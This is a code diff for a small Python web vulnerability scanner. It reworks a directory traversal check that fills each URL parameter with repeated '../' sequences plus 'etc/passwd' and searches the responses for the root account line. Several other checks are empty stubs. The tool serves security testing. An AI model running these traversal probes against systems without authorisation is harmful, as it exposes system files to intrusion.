@@ -12,59 +12,45 @@ class Scanner(object):
         self.attack_script = ''
         self.safe = True
         self.category = ''
-        
-    def scan(self):
-        if (
-            self.sqli() or
-            self.serverInj() or
-            self.dirTra() or
-            self.redir() or
-            self.csrf() or
-            self.shellInj()
-        ):
-            self.safe = False
-        if self.safe:
-            print(self.category)
     
     def dirTra(self, depth=10):
         feed = ["etc/passwd"]
         prefix = '../'
-        url_parsed = urlparse(self.url)
-        params = url_parsed.params
-        nuggets = ['root/:/bin/bash']
+        params = getParams(self.url)
+        nuggets = ['root:x:0:0:root:/root:/bin/bash']
         key_params = {}
-        print(params)
         
         i = 0
         hit = False
         
-        if(not params): # if url contain no parameters
+        if(not len(params.keys())): # if url contain no parameters
             return False
         else:
-            for p in parms:
+            for p in params:
                 if hit: # if already hit
                     break
                 # brute exploite by incremently adding '../'
                 while i < depth and not hit :
                     # exploite every paramters in the url
-                    for f in feed:
-                        evil_param = i*prefix+f
-                        content = str(getHTML(self.base,{f:evil_para}))
-                        for n in nuggets:
-                            if n in content:
-                                hit = True
-                                key_params = evil_param
-                i+=1
+                    for key in params.keys():
+                        for f in feed:
+                            evil_value = i*prefix+f
+                            payload = {key:evil_value}
+                            content = str(getHTML(self.base,payload))
+                            for n in nuggets:
+                                if n in content:
+                                    hit = True
+                                    key_params = payload
+                    i+=1
 
         if hit:
             self.category = DT
-            endpoint = '/'+self.base.split('/')[:-1]
-            render[DT](self.base,endpoint,key_params,'GET')
+            endpoint = urlparse(self.base).path
+            render[DT](endpoint,key_params,'GET')
         return hit
                     
-
     def serverInj(self):
-        category = "Shell Injection"
+        category = SI
         return False
     
     def shellInj(self):
@@ -79,6 +65,17 @@ class Scanner(object):
     def csrf(self):
         return False
         
+    def scan(self):
+        if (self.sqli() or
+            self.serverInj() or
+            self.dirTra() or
+            self.redir() or
+            self.csrf() or
+            self.shellInj()):
+            self.safe = False
+            
+        if not self.safe:
+            print(self.category)
     
 
     
